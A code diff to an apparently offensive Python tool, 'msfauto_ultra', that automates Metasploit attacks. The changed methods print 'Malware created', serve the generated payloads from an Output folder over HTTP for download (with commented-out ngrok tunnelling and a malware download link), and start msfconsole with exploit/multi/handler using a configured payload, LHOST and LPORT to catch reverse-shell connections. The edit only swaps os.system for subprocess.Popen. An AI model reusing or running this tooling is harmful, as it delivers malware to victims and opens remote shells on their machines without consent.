@@ -18,7 +18,9 @@ class msfauto_ultra():
         print(Fore.GREEN + "Malware created. continue...")
     def craete_http_server(self):
         create_output_folder()
-        os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"), print(Fore.RED + "You closed http server.")
+        # os.system(), print(Fore.RED + "You closed http server.")
+        http_server = subprocess.Popen(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
+        http_server.wait()
     def return_links(self):  
         pass
         # print(Fore.WHITE + "\n\nThis is the malware download link: ")
@@ -30,7 +32,8 @@ class msfauto_ultra():
         # print(f"ngrok http {self.port2}")
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
-        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
+        msfconsole = subprocess.Popen(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
+        msfconsole.wait()
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
